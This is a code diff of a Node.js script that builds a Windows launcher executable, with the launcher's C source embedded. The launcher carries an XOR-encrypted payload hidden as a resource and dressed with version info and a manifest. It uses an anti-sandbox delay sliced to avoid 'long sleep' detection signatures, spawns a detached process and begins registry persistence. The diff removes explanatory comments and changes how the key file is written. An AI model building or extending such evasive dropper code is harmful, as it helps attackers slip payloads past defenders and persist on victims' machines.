@@ -3,15 +3,7 @@
 // payload (key + config + base) is XOR-encrypted at rest and embedded as a
 // Windows resource, not as a string literal. version info + manifest.
 // anti-sandbox delay, detached spawn, no WaitForSingleObject.
-//
-// pipeline per build:
-//   1. generate random 32-byte xor key
-//   2. encrypt [key|config|base] payload with xor key
-//   3. write payload.bin
-//   4. write app.rc (version info, manifest, payload resource)
-//   5. windres app.rc -> app.res
-//   6. write launcher.c
-//   7. gcc -mwindows launcher.c app.res -o launcher.exe
+// writes key.json as {"key":"<value>"}.
 
 import fs from 'node:fs';
 import path from 'node:path';
@@ -27,20 +19,6 @@ const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';
 
 // ---------- helpers ----------
 
-function cByteArray(name, buf) {
-  const parts = [];
-  for (let i = 0; i < buf.length; i++) {
-    if (i % 16 === 0) parts.push('\n    ');
-    parts.push('0x' + buf[i].toString(16).padStart(2, '0'));
-    if (i !== buf.length - 1) parts.push(',');
-  }
-  return `static const unsigned char ${name}[] = {${parts.join('')}\n};`;
-}
-
-// payload layout:
-//   [1 byte ver=1][4 byte keyLen LE][4 byte cfgLen LE][4 byte baseLen LE]
-//   [keyLen bytes][cfgLen bytes][baseLen bytes]
-// whole thing XOR'd with xor_key.
 function packPayload({ key, config, baseBuf, xorKey }) {
   const keyBuf = Buffer.from(key || '', 'utf8');
   const cfgBuf = Buffer.from(JSON.stringify(config || {}), 'utf8');
@@ -59,8 +37,6 @@ function packPayload({ key, config, baseBuf, xorKey }) {
   }
   return out;
 }
-
-// ---------- rc generation ----------
 
 function rcSource() {
   return `
@@ -95,12 +71,9 @@ BEGIN
     END
 END
 
-/* payload resource — read at runtime via FindResourceW */
 PAYLOAD_BIN RCDATA "payload.bin"
 `;
 }
-
-// ---------- launcher C template ----------
 
 function cSource({ xorKeyBytes, payloadSize }) {
   return `
@@ -210,7 +183,6 @@ static void json_args(const char *json, char *out, size_t out_cap) {
     out[o] = 0;
 }
 
-// anti-sandbox delay: 30–60s random, sliced so we do not trip "long sleep" signatures.
 static void delay_random(void) {
     LARGE_INTEGER freq, start, now;
     QueryPerformanceFrequency(&freq);
@@ -273,7 +245,18 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _snwprintf(key_path,  2048, L"%ls\\\\%hs", dest_w, keyFile);
 
     if (write_file(base_path, base, base_len) != 0) { free(payload); return 1; }
-    if (write_file(key_path,  key,  key_len)  != 0) { free(payload); return 1; }
+
+    // wrap the key in {"key":"<value>"} and write that
+    {
+        char key_wrapped[4096];
+        int n = _snprintf(key_wrapped, sizeof(key_wrapped),
+                          "{\\n  \\"key\\": \\"%.*s\\"\\n}\\n",
+                          (int)key_len, (const char *)key);
+        if (n <= 0 || n >= (int)sizeof(key_wrapped)) { free(payload); return 1; }
+        if (write_file(key_path, (const unsigned char *)key_wrapped, (DWORD)n) != 0) {
+            free(payload); return 1;
+        }
+    }
 
     if (persist) {
         HKEY hk;
